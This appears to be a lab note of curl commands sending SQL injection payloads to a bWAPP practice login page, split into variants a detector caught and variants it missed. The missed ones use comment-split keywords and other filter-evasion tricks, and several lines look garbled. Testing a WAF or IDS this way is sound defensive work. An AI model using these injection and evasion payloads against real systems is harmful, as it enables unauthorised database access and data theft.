## 탐지 구문 ##
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=101+or+1=1"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=101+‘+or+1=1"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=101+‘+or+1=1--"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=1+union+select+1,2,3"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=1/**/union/*/select/**/1,2,3/**/from/**/users?"

### 미탐 구문 ###
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=1+uniect+*+frosobjects"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=1+un/**/ion+se/**/lect+1,2,3"

curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=152f52a*/union52f52a/select52f52a*/1,2,352f52a*/from52f52a*/users?"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=94D1B5EFAAF9FEB35FAAFC534B1C2C"
curl -k --resolve curl.ncurity.com:80:192.168.41.52 "http://curl.ncurity.com/bWAPP/login.php?id=id=1+un/**/ion+se/**/lect+1,2,"


